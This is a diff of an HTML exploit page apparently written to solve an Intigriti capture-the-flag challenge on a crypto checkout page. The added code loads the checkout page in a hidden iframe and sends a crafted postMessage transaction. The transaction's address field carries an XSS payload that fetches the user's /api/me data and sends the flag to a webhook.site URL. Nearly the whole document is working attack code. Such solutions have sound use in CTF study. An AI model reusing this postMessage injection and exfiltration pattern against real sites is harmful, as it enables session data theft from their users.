@@ -1,40 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Send 1337COIN Exploit</title>
-</head>
 <body>
 <script>
-// Listen for any responses
-window.addEventListener('message', (event) => {
-    console.log('Response from target:', event.data);
-});
+// Open checkout page in hidden iframe
+const iframe = document.createElement('iframe');
+iframe.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1';
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
 
-// Send the exploit
-setTimeout(() => {
-    const exploitPayload = {
-        type: 'submitTransaction',
-        transaction: {
-            toAddress: '10970063d33e32396bb80753a2b902d56', // Your wallet
-            currency: '1337COIN',  // Special CTF currency
-            amount: 1337  // CTF number
-        }
-    };
-    
-    console.log('Sending exploit:', exploitPayload);
-    
-    // Send to checkout page
-    window.opener.postMessage(exploitPayload, '*');
-    
-    alert('Exploit sent! Check if transaction succeeded.');
-}, 1500);
+iframe.onload = () => {
+  setTimeout(() => {
+    // Inject XSS payload via postMessage
+    iframe.contentWindow.postMessage({
+      type: 'submitTransaction',
+      transaction: {
+        toAddress: '<img/src="x"/onerror="fetch(`/api/me`).then(r=>r.json()).then(d=>fetch(`https://webhook.site/5c699d9b-1a2c-4d4c-a79a-d3f7b3fac905?f=${encodeURIComponent(d.flag)}`))">',
+        currency: '1337COIN',
+        amount: 0.00000001
+      }
+    }, '*');
+  }, 1000);
+};
 </script>
-<h3>1337COIN Transfer Exploit</h3>
-<p>Make sure:</p>
-<ol>
-    <li>You're logged into CRYPTIGRITI</li>
-    <li>checkout.html is open in another tab</li>
-    <li>Check console for responses (F12 → Console)</li>
-</ol>
 </body>
 </html>
